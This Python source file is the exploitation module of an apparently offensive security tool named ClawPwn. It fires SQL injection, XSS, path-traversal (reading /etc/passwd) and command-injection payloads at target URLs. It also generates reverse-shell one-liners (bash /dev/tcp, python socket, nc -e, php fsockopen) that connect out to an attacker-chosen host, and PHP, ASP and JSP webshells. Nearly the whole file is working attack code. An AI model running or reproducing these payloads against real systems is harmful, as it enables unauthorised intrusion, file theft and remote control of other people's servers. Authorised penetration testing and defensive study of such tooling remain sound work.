"""Exploitation module for ClawPwn.

Handles exploit execution, payload generation, and foothold establishment.
"""

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from clawpwn.config import get_project_db_path
from clawpwn.modules.session import SessionManager
from clawpwn.tools.http import HTTPClient


@dataclass
class ExploitResult:
    """Result of an exploit attempt."""

    success: bool
    title: str
    target: str
    technique: str
    output: str = ""
    error: str = ""
    shell_url: str = ""
    session_id: str = ""
    notes: str = ""


@dataclass
class Payload:
    """Represents an exploit payload."""

    name: str
    content: str
    content_type: str = "text/plain"
    encoding: str = ""
    parameters: dict[str, Any] = field(default_factory=dict)


class ExploitManager:
    """Manages exploitation operations."""

    def __init__(self, project_dir: Path | None = None):
        self.project_dir = project_dir
        self.session: SessionManager | None = None
        self.exploit_dir: Path | None = None

        if project_dir:
            self.exploit_dir = project_dir / "exploits"
            self.exploit_dir.mkdir(exist_ok=True)

            db_path = get_project_db_path(project_dir)
            if db_path and db_path.exists():
                self.session = SessionManager(db_path)

    async def exploit_sql_injection(
        self, target: str, parameter: str, technique: str = "error_based"
    ) -> ExploitResult:
        """
        Attempt to exploit a SQL injection vulnerability.

        Args:
            target: URL with vulnerable parameter
            parameter: Parameter name
            technique: SQLi technique (error_based, union_based, blind)
        """
        print(f"[*] Attempting SQL injection on {target}")

        result = ExploitResult(
            success=False,
            title="SQL Injection Exploit",
            target=target,
            technique=technique,
        )

        try:
            async with HTTPClient() as client:
                # Test basic SQLi
                test_payload = "' AND 1=1--"

                # Parse URL and inject payload
                import urllib.parse

                parsed = urllib.parse.urlparse(target)
                params = urllib.parse.parse_qs(parsed.query)

                if parameter in params:
                    test_params = {k: v[0] if v else "" for k, v in params.items()}
                    test_params[parameter] = test_payload

                    response = await client.request("GET", target, params=test_params)

                    # Check if error occurred
                    if any(x in response.body.lower() for x in ["sql", "mysql", "syntax"]):
                        result.success = True
                        result.output = "SQL injection confirmed - database error triggered"
                        result.notes = f"Payload: {test_payload}"

                        # Try to get database version
                        version_payloads = [
                            "' UNION SELECT @@version--",
                            "' UNION SELECT version()--",
                        ]

                        for v_payload in version_payloads:
                            test_params[parameter] = v_payload
                            v_response = await client.request("GET", target, params=test_params)

                            # Look for version patterns
                            if any(x in v_response.body for x in ["5.", "8.", "10.", "MariaDB"]):
                                result.output += "\nDatabase version information extracted"
                                break

                else:
                    result.error = f"Parameter '{parameter}' not found in URL"

        except Exception as e:
            result.error = str(e)

        if result.success:
            print("[+] SQL Injection successful!")
            if self.session:
                self.session.add_log(
                    f"Exploited SQL injection on {target}",
                    level="WARNING",
                    phase="Exploitation",
                )
        else:
            print(f"[-] SQL Injection failed: {result.error}")

        return result

    async def exploit_xss(
        self, target: str, parameter: str, payload_type: str = "alert"
    ) -> ExploitResult:
        """
        Exploit XSS vulnerability.

        This is mainly for verification - XSS is client-side.
        """
        print(f"[*] Verifying XSS on {target}")

        result = ExploitResult(
            success=False,
            title="Cross-Site Scripting (XSS)",
            target=target,
            technique="reflected",
        )

        try:
            async with HTTPClient() as client:
                # Test payload
                if payload_type == "alert":
                    payload = "<script>alert('XSS')</script>"
                else:
                    payload = "<img src=x onerror=alert('XSS')>"

                import urllib.parse

                parsed = urllib.parse.urlparse(target)
                params = urllib.parse.parse_qs(parsed.query)

                if parameter in params:
                    test_params = {k: v[0] if v else "" for k, v in params.items()}
                    test_params[parameter] = payload

                    response = await client.request("GET", target, params=test_params)

                    # Check if payload reflected without encoding
                    if payload in response.body:
                        result.success = True
                        result.output = f"XSS payload reflected unencoded\nPayload: {payload}"

                        # Check if script tag is preserved
                        if "<script>" in response.body:
                            result.technique = "reflected_stored"

                else:
                    result.error = f"Parameter '{parameter}' not found in URL"

        except Exception as e:
            result.error = str(e)

        if result.success:
            print("[+] XSS confirmed!")
        else:
            print(f"[-] XSS verification failed: {result.error}")

        return result

    async def exploit_path_traversal(
        self, target: str, parameter: str, file_to_read: str = "/etc/passwd"
    ) -> ExploitResult:
        """
        Exploit path traversal vulnerability.
        """
        print(f"[*] Attempting path traversal on {target}")

        result = ExploitResult(
            success=False,
            title="Path Traversal",
            target=target,
            technique="directory_traversal",
        )

        try:
            async with HTTPClient() as client:
                # Path traversal payloads
                payloads = [
                    f"../../../..{file_to_read}",
                    f"....//....//....//....//{file_to_read}",
                    f"%2e%2e%2f%2e%2e%2f%2e%2e%2f{file_to_read}",
                ]

                for payload in payloads:
                    test_url = f"{target}?{parameter}={payload}"
                    response = await client.get(test_url)

                    # Check for file contents
                    if "root:" in response.body:
                        result.success = True
                        result.output = f"Successfully read {file_to_read}\n\nFirst 500 chars:\n{response.body[:500]}"
                        result.notes = f"Working payload: {payload}"
                        break

        except Exception as e:
            result.error = str(e)

        if result.success:
            print("[+] Path traversal successful!")
            if self.session:
                self.session.add_log(
                    f"Exploited path traversal on {target}",
                    level="WARNING",
                    phase="Exploitation",
                )
        else:
            print(f"[-] Path traversal failed: {result.error}")

        return result

    async def exploit_command_injection(self, target: str, parameter: str) -> ExploitResult:
        """
        Exploit command injection vulnerability.
        """
        print(f"[*] Attempting command injection on {target}")

        result = ExploitResult(
            success=False,
            title="Command Injection",
            target=target,
            technique="os_command",
        )

        try:
            async with HTTPClient() as client:
                # Command injection payloads
                payloads = [
                    "; id",
                    "; whoami",
                    "| id",
                    "| whoami",
                    "` id `",
                    "$(id)",
                ]

                import urllib.parse

                parsed = urllib.parse.urlparse(target)
                params = urllib.parse.parse_qs(parsed.query)

                if parameter in params:
                    for payload in payloads:
                        test_params = {k: v[0] if v else "" for k, v in params.items()}
                        test_params[parameter] = payload

                        response = await client.request("GET", target, params=test_params)

                        # Check for command output
                        if "uid=" in response.body or "gid=" in response.body:
                            result.success = True
                            result.output = f"Command executed successfully\nPayload: {payload}\nOutput: {response.body[:200]}"
                            break

                else:
                    result.error = f"Parameter '{parameter}' not found"

        except Exception as e:
            result.error = str(e)

        if result.success:
            print("[+] Command injection successful!")
            if self.session:
                self.session.add_log(
                    f"Exploited command injection on {target}",
                    level="CRITICAL",
                    phase="Exploitation",
                )
        else:
            print(f"[-] Command injection failed: {result.error}")

        return result

    def generate_reverse_shell(self, ip: str, port: int, language: str = "bash") -> Payload:
        """Generate a reverse shell payload."""

        payloads = {
            "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
            "nc": f"nc -e /bin/sh {ip} {port}",
            "php": f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        }

        content = payloads.get(language, payloads["bash"])

        return Payload(
            name=f"reverse_shell_{language}",
            content=content,
            parameters={"ip": ip, "port": port},
        )

    def generate_webshell(self, language: str = "php") -> Payload:
        """Generate a simple webshell."""

        shells = {
            "php": "<?php system($_GET['cmd']); ?>",
            "asp": '<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>',
            "jsp": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        }

        content = shells.get(language, shells["php"])

        return Payload(
            name=f"webshell.{language}",
            content=content,
            content_type="text/plain",
        )

    def save_exploit(self, name: str, content: str) -> Path:
        """Save an exploit to the project exploits folder."""
        if not self.exploit_dir:
            raise ValueError("No project directory set")

        exploit_file = self.exploit_dir / name
        exploit_file.write_text(content)

        return exploit_file

    async def auto_exploit(
        self, target: str, finding_type: str, parameter: str, **kwargs
    ) -> ExploitResult:
        """
        Automatically exploit a known vulnerability type.

        Args:
            target: Target URL
            finding_type: Type of vulnerability (sqli, xss, path_traversal, cmd_injection)
            parameter: Vulnerable parameter name
            **kwargs: Additional parameters for specific exploits
        """
        exploit_methods = {
            "sql_injection": self.exploit_sql_injection,
            "xss": self.exploit_xss,
            "path_traversal": self.exploit_path_traversal,
            "command_injection": self.exploit_command_injection,
        }

        method = exploit_methods.get(finding_type.lower())

        if not method:
            return ExploitResult(
                success=False,
                title=f"Unknown exploit type: {finding_type}",
                target=target,
                technique="unknown",
                error=f"No exploit method for {finding_type}",
            )

        return await method(target, parameter, **kwargs)


# Convenience functions
async def exploit_finding(
    target: str, finding_type: str, parameter: str, project_dir: Path | None = None
) -> ExploitResult:
    """Quick exploit of a finding."""
    manager = ExploitManager(project_dir)
    return await manager.auto_exploit(target, finding_type, parameter)
